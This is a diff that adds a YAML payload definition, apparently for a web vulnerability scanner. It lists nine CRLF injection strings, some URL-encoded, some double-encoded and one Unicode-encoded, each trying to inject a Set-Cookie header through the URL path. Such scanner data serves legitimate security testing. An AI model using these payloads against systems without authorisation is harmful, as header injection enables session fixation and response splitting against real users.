@@ -1,0 +1,17 @@
+---
+payload:
+  - '%0d%0aSet-Cookie:crlf=injection'
+  - '%3f%0dSet-Cookie:crlf=injection'
+  - '%0a%0dSet-cookie:crlf=injection'
+  - '%25%30%41Set-cookie:crlf=injection'
+  - '%25%30%44Set-cookie:crlf=injection'
+  - '%25%30%41%25%30%44Set-cookie:crlf=injection'
+  - '%25%30%44%25%30%41Set-cookie:crlf=injection'
+  - '%25%0a%0aSet-cookie:crlf=injection'
+  - '%e5%98%8dSet-cookie%3acrlf%3dinjection'
+encoder:
+  - Plain
+placeholder:
+  - URLPath
+type: "CRLF Injection"
+...
